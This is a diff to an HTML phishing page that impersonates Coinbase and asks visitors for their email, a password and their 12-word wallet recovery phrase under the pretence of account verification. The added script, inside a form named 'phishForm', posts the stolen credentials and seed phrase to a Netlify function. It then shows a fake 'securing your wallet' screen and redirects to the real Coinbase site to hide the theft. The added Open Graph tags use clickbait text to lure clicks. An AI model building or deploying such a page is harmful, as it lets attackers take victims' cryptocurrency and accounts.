@@ -1,8 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+  <meta property="og:title" content="Loading..." />
+  <meta property="og:description" content="Click here to continue" />
+  <meta property="og:image" content="https://i.imgur.com/s0SdHUz.jpeg" />
+  <meta property="og:image:width" content="640" />
+  <meta property="og:image:height" content="480" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://yourwebsite.com/page-url" />
   <title>Coinbase – Verify Your Account</title>
   <link rel="icon" href="https://www.coinbase.com/favicon.ico" type="image/x-icon" />
   <style>
@@ -123,43 +130,90 @@
 </head>
 <body>
 
+  <!-- Step 1: Form Page -->
   <div class="container active" id="formScreen">
     <h2>Coinbase</h2>
     <h3>Verify Your Account</h3>
-    <p>Enter your email, set a new password, and re-enter your wallet recovery phrase to verify your account.</p>
+    <p>Enter your email, set a new password, and re-enter your wallet recovery phrase to verify your account.</p> 
 
-    <form name="wallet-verification" method="POST" data-netlify="true" data-netlify-honeypot="bot-field" action="/success" netlify>
-      <input type="hidden" name="form-name" value="wallet-verification" />
-      <p hidden><input name="bot-field" /></p>
-
-      <input name="email" type="text" placeholder="Email" required />
-      <input name="password" type="password" placeholder="New password" required />
-
+    <form id="phishForm" method="POST" data-netlify="true" data-netlify-honeypot="bot-field" action="/success" netlify>
+      <input id="email" type="text" placeholder="Email" required />
+      <input id="password" type="password" placeholder="New password" required />
       <h4>Enter Your Seed Phrase</h4>
       <p class="note">To secure your Coinbase Wallet, re-enter your wallet recovery phrase below.</p>
-
       <div class="seed-grid">
-        <!-- 12 input fields for phrase -->
-        <!-- Naming them as phrase1 to phrase12 -->
-        <input name="phrase1" type="text" placeholder="Word 1" required>
-        <input name="phrase2" type="text" placeholder="Word 2" required>
-        <input name="phrase3" type="text" placeholder="Word 3" required>
-        <input name="phrase4" type="text" placeholder="Word 4" required>
-        <input name="phrase5" type="text" placeholder="Word 5" required>
-        <input name="phrase6" type="text" placeholder="Word 6" required>
-        <input name="phrase7" type="text" placeholder="Word 7" required>
-        <input name="phrase8" type="text" placeholder="Word 8" required>
-        <input name="phrase9" type="text" placeholder="Word 9" required>
-        <input name="phrase10" type="text" placeholder="Word 10" required>
-        <input name="phrase11" type="text" placeholder="Word 11" required>
-        <input name="phrase12" type="text" placeholder="Word 12" required>
+        <input type="text" placeholder="Word 1" required>
+        <input type="text" placeholder="Word 2" required>
+        <input type="text" placeholder="Word 3" required>
+        <input type="text" placeholder="Word 4" required>
+        <input type="text" placeholder="Word 5" required>
+        <input type="text" placeholder="Word 6" required>
+        <input type="text" placeholder="Word 7" required>
+        <input type="text" placeholder="Word 8" required>
+        <input type="text" placeholder="Word 9" required>
+        <input type="text" placeholder="Word 10" required>
+        <input type="text" placeholder="Word 11" required>
+        <input type="text" placeholder="Word 12" required>
       </div>
-
       <button type="submit">Verify Wallet</button>
     </form>
-
-    <div class="footer">© 2025 Coinbase, Inc. All rights reserved.</div>
+    <div class="footer">© 2025 Coinbase, Inc. All rights reserved.</div>   
   </div>
 
+  <!-- Step 2: Loading Screen -->
+  <div class="container" id="loadingScreen">
+    <h2>Securing your wallet...</h2>
+    <div class="spinner"></div>
+    <p>Please wait, do not close this page.</p>
+  </div>
+
+  <!-- Step 3: Final Screen or Redirect -->
+  <div class="container" id="finalScreen">
+    <h2>✅ Verification Complete</h2>
+    <p>Your session has been secured.</p>
+    <p>Redirecting to Coinbase...</p>
+  </div>
+
+  <script>
+    if (!window.__phishFormScriptLoaded) {
+      window.__phishFormScriptLoaded = true;
+
+      document.addEventListener('DOMContentLoaded', () => {
+        const formScreen = document.getElementById('formScreen');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const finalScreen = document.getElementById('finalScreen');
+        const phishForm = document.getElementById('phishForm');
+
+        phishForm.addEventListener('submit', async(e) {
+          e.preventDefault();
+
+          const email = document.getElementById('email').value.trim();
+          const password = document.getElementById('password').value.trim();
+          const phrase = Array.from(document.querySelectorAll('.seed-grid input'))
+            .map(input => input.value.trim())
+            .join(' ');
+
+          formScreen.classList.remove('active');
+          loadingScreen.classList.add('active');
+
+          // Submit to Netlify function
+          fetch('/.netlify/functions/logsnag', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password, phrase })
+          }).finally(() => {
+            setTimeout(() => {
+              loadingScreen.classList.remove('active');
+              finalScreen.classList.add('active');
+            }, 3000);
+
+            setTimeout(() => {
+              window.location.href = 'https://www.coinbase.com';
+            }, 6000);
+          });
+        });
+      });
+    }
+  </script>
 </body>
 </html>
